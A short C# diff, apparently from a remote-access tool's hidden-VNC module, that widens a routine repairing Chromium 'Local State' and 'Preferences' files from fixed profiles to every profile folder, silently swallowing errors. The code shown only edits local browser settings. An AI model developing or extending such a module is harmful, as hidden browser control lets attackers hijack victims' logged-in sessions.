@@ -1629,12 +1629,13 @@ internal static class HvncFeature
                 dir = Path.Combine(dir, part);
             if (!Directory.Exists(dir)) continue;
             RepairChromiumJsonFile(Path.Combine(dir, "Local State"));
-            foreach (var sub in new[] { "Default", "Profile 1", "Profile 2", "Guest Profile" })
+            // Enumerate all profile subdirs so Profile 3, Profile 4, etc. are also covered
+            try
             {
-                string subDir = Path.Combine(dir, sub);
-                if (!Directory.Exists(subDir)) continue;
-                RepairChromiumJsonFile(Path.Combine(subDir, "Preferences"));
+                foreach (var sub in Directory.EnumerateDirectories(dir))
+                    try { RepairChromiumJsonFile(Path.Combine(sub, "Preferences")); } catch { }
             }
+            catch { }
         }
     }
 
